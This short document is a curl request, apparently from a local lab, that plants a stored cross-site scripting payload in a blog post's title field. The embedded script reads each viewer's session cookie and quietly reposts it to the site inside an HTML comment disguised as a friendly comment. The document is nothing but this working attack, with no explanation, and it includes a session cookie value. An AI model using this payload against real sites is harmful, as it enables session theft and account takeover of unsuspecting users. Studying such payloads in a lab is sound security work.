curl --request POST \
  --url http://localhost:3000/newPost \
  --header 'authorization: Basic Og==' \
  --header 'content-type: application/json' \
  --cookie connect.sid=s%253AAHIA5OboVJ88QYS18_wN3xp-bK7X4K5J.Cgk7As9KjccRBHeI227Y2ZgxIhroVQiZUGYhjeAMiqM \
  --data '{ "title": "<script>const xhttp = new XMLHttpRequest();\r\nxhttp.open(\"POST\", \"\/newPost\", true);\r\nxhttp.setRequestHeader(\"Content-type\", \"application\/json\");\r\nxhttp.send(JSON.stringify({title: '\''<!--'\'' + document.cookie + '\''--> Great blog post!'\'', body: '\''Hello World!'\''}));\r\n<\/script>"}'